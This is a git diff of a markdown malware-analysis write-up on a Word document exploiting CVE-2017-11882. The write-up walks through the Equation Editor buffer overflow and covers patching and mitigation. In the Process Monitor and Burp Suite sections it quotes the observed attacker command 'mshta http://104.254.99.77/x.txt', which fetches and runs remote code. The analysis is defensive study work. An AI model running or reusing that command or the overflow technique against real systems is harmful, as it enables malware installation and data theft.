@@ -31,7 +31,7 @@ It is used to monitor and display all the activities of file system in real-time
 * Unexpected operation named 'EQNEDT32.EXE'
 * Command line has been called
 * (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
-![]()  
+![Process Monitor](https://github.com/tingsama/hacking-p2/blob/main/Process%20Monitor.png)  
 
 
 ### Burp Suite
@@ -39,19 +39,19 @@ It is a [web vulnerability scanner](https://portswigger.net/burp).
 It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
 * Unexpected 'GET' request 
 * (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
-![]()  
+![Burp Suite](https://github.com/tingsama/hacking-p2/blob/main/Burp%20Suite.png)  
 
 
 ### Steps after you click the malicious word file:
-1. Microsoft Word file load up  
+###### 1. Microsoft Word file load up  
 Here microsoft word will load up and read and compile the stuff inside.  
 ![step 1](https://github.com/tingsama/hacking-p2/blob/main/step%201.png)  
-2. Execute Equation Editor  
+###### 2. Execute Equation Editor  
 Everyone used the equation editor before, to create the nice look equations.  
 However, the equation editor is another individual program and Microsoft Word invokes its own process.  
 In this case, everything inside the equation editor can skip all Microsoft protection bubbles.  
 ![step 2](https://github.com/tingsama/hacking-p2/blob/main/step%202.png)  
-3. Hacker overflowed the font name registers inside Equation Editor  
+###### 3. Hacker overflowed the font name registers inside Equation Editor  
 Before overflow EAX save the length of font name which is 16 bytes (Hex:00000010).  
 And the detail inside the font name registers is “TIMES NEW ROMAN”.  
 ![step 3-1](https://github.com/tingsama/hacking-p2/blob/main/step%203-1.png)  
@@ -60,20 +60,20 @@ On memory 004115CF, it loads whatever is inside the ebp register and pushes into
 The ebp register is a two way pointer and linking between word document and equation editor.  
 The hacker changed the ebp register value to 48 bytes and then it was loaded to the EAX register.  
 ![step 3-2](https://github.com/tingsama/hacking-p2/blob/main/step%203-2.png)  
-4. Overflow message  
+###### 4. Overflow message  
 Let now take a look at the 48 bytes detail inside the overflowed register beginning at address: 0012F350.  
 From address 0012F350 to 0012F360 32 bytes are saving the hacker's mshta link and it can send a get request to this link and download the malicious software.  
-Address: 0012F370 first 12 bytes are ‘20’ which are saving shell code inside but we cannot see it in detail through ASCii reader.  
+Address: 0012F370 first 12 bytes are ‘20’ which are saving shell code inside but we cannot see it in detail through ASCii reader.   
 The final 4 bytes are ‘12 0C 43 00’ which is the new EIP register address that the hacker wants us to jump to in the next step.  
 ![step 4](https://github.com/tingsama/hacking-p2/blob/main/step%204.png)  
-5. Redirect to new EIP address  
+###### 5. Redirect to new EIP address  
 Here we can see at address: 00430C12 it call the Winexe program.  
 ![step 5](https://github.com/tingsama/hacking-p2/blob/main/step%205.png)  
-6. Winexe execute   
+###### 6. Winexe execute   
 From the code here we can see the Winexe execute at address 00430C12 and talk to the EAX register as it input.  
 In this case, inside the Winexe it will run shell code first, then send a get request to the hacker's link.  
 ![step 6](https://github.com/tingsama/hacking-p2/blob/main/step%206.png)  
-7. Download hacker’s malicious software   
+###### 7. Download hacker’s malicious software   
 Finally after everything executes and runs correctly, it will download the malicious software and hide in some specific hard finding place to continuously steal your personal information.  
 
 
@@ -94,7 +94,7 @@ The best way to protect your machine from this vulnerability is patching.
 However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.  
 The following commands can update your registry to disable EQUAEDT32.exe.  
 If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice.
-![]()  
+![Update Registry](https://github.com/tingsama/hacking-p2/blob/main/Update%20Registry.png)  
 
 
 ### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
@@ -102,6 +102,6 @@ The official patching for CVE-2017-11882 was done in a Patch Tuesday update in N
 The difference of the patched function(left hand side) and the original function(right hand side) is shown below.  
 The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.  
 The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]  
-![]()  
+![Official Patc](https://github.com/tingsama/hacking-p2/blob/main/Official%20Patch.png)  
 
 
